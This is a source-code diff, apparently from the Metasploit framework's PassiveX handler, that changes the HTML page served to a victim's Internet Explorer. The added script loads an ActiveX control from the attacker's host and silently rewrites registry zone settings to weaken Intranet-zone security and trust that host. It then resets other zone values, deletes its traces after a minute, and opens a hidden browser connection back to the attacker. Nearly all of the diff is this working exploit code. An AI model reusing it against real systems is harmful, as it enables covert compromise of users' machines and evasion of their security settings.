@@ -312,17 +312,59 @@ protected
 				nsid = sid_pool
 
 				resp['Content-Type'] = 'text/html'
-				resp.body = 
-					"<html>" +
-					"	<object classid=\"CLSID:#{datastore['PXAXCLSID']}\" codebase=\"#{datastore['PXURI'] + "/"}passivex.dll##{datastore['PXAXVER']}\">" +
-					"		<param name=\"HttpHost\" value=\"#{datastore['PXHOST']}\">" +		
-					"		<param name=\"HttpPort\" value=\"#{datastore['PXPORT']}\">" +
-					"		<param name=\"HttpUriBase\" value=\"#{datastore['PXURI']}\">" +
-					"		<param name=\"HttpSid\" value=\"#{nsid}\">" +
-					((stage_payload) ? 
-					"		<param name=\"DownloadSecondStage\" value=\"1\">" : "") +
-					"	</object>" +
-					"</html>"
+				# natron 2/27/09: modified to work with IE7/IE8. For some reason on IE8 this can spawn extra set
+				# of processes. It works, so will go ahead and commit changes and debug later to run it down.
+				resp.body = %Q^<html>  
+<object classid="CLSID:#{datastore['PXAXCLSID']}" codebase="#{datastore['PXURI']}/passivex.dll##{datastore['PXAXVER']}">      
+   <param name="HttpHost" value="#{datastore['PXHOST']}">  
+   <param name="HttpPort" value="#{datastore['PXPORT']}">
+   <param name="HttpUriBase" value="#{datastore['PXURI']}">  
+   <param name="HttpSid" value="#{nsid}">^ + ((stage_payload) ? %Q^
+   <param name="DownloadSecondStage" value="1">^ : "") + %Q^
+</object>
+<script>
+var WshShell = new ActiveXObject("Wscript.Shell");
+var marker = true;
+var regCheck;
+var regRange = "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Ranges\\\\random\\\\" //Can be any value
+var regIntranet = "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\1\\\\";
+
+//Check if we've run this before.
+try { regCheck = WshShell.RegRead(regRange + "marker"); } catch (e) { marker = false; }
+
+if (marker == false) {
+   //Modify perms for the Intranet zone.
+   WshShell.RegWrite(regIntranet + "1001",0,"REG_DWORD");
+   WshShell.RegWrite(regIntranet + "1004",0,"REG_DWORD");
+   WshShell.RegWrite(regIntranet + "1200",0,"REG_DWORD");
+   WshShell.RegWrite(regIntranet + "1201",0,"REG_DWORD");
+   WshShell.RegWrite(regIntranet + "1208",0,"REG_DWORD");
+
+   //Map IP to the newly modified zone.
+   WshShell.RegWrite(regRange,1,"REG_SZ");
+   WshShell.RegWrite(regRange + ":Range","#{datastore['PXHOST']}","REG_SZ");
+   WshShell.RegWrite(regRange + "*",1,"REG_DWORD");
+   WshShell.RegWrite(regRange + "marker",1,"REG_DWORD"); //Just a marker
+
+   //Clean up after the original passivex stage1 loader; reset to default IE7 install
+   var regDefault = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\3\\\\";
+   WshShell.RegWrite(regDefault + "1001",1,"REG_DWORD");
+   WshShell.RegWrite(regDefault + "1004",3,"REG_DWORD");
+   WshShell.RegWrite(regDefault + "1200",0,"REG_DWORD");
+   WshShell.RegWrite(regDefault + "1201",3,"REG_DWORD");
+
+   //Clean up and delete the created entries
+   setTimeout('WshShell.RegDelete(regIntranet + "1001")', 60000);
+   setTimeout('WshShell.RegDelete(regIntranet + "1004")', 60000);
+   setTimeout('WshShell.RegDelete(regIntranet + "1200")', 60000);
+   setTimeout('WshShell.RegDelete(regIntranet + "1201")', 60000);
+   setTimeout('WshShell.RegDelete(regIntranet + "1208")', 60000);
+   setTimeout('WshShell.RegDelete(regRange)', 60000);
+
+   WshShell.Run("iexplore.exe -new http://#{datastore['PXHOST']}:#{datastore['PXPORT']}#{datastore['PXURI']}",0,false);
+}
+</script>
+</html>^
 
 				# Create a new local PX session with the supplied sid
 				new_session_channel(nsid)
